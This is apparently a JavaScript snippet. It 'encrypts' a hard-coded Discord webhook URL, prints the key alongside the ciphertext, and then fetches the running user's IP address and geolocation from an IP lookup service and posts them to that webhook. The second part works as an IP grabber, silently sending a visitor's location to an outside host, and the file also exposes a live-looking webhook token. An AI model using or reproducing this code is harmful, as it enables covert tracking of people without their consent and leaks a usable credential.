async function encryptWebhook(webhook) {
    const keyBytes = crypto.getRandomValues(new Uint8Array(32)); // 256-bit AES key
    const iv = crypto.getRandomValues(new Uint8Array(16)); // 128-bit IV

    const encoder = new TextEncoder();
    const data = encoder.encode(webhook);

    const cryptoKey = await crypto.subtle.importKey(
        'raw',
        keyBytes,
        { name: 'AES-CBC' },
        false,
        ['encrypt']
    );

    const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-CBC', iv: iv },
        cryptoKey,
        data
    );

    const encryptedArray = new Uint8Array(encrypted);
    const encryptedBase64 = btoa(String.fromCharCode(...encryptedArray));
    const ivBase64 = btoa(String.fromCharCode(...iv));

    return {
        ciphertext: encryptedBase64,
        iv: ivBase64,
        key: btoa(String.fromCharCode(...keyBytes)) // For demonstration only
    };
}

console.log("Script is running...");
encryptWebhook("https://discord.com/api/webhooks/1384868336583708692/XcCOUDJijO6fENYdsFwJL0-lH6rCxBAK7RfgtS6BsfNKjsp-sykaF66n5PcjKAaDouiU")
    .then(result => console.log(result));



// send webhook to discord

async function getIpAndLocation() {
    const res = await fetch('https://ipapi.co/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return await res.json();
}

async function sendWebhook(webhookUrl, data) {
    const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
    return await response.json();
}

getIpAndLocation()
    .then(info => {
        const content = `IP: ${info.ip}\nCity: ${info.city}\nRegion: ${info.region}\nCountry: ${info.country_name}`;
        return sendWebhook(
            "https://discord.com/api/webhooks/1384868336583708692/XcCOUDJijO6fENYdsFwJL0-lH6rCxBAK7RfgtS6BsfNKjsp-sykaF66n5PcjKAaDouiU",
            { content }
        );
    })
    .then(response => console.log("Webhook sent successfully:", response))
    .catch(error => console.error("Error:", error));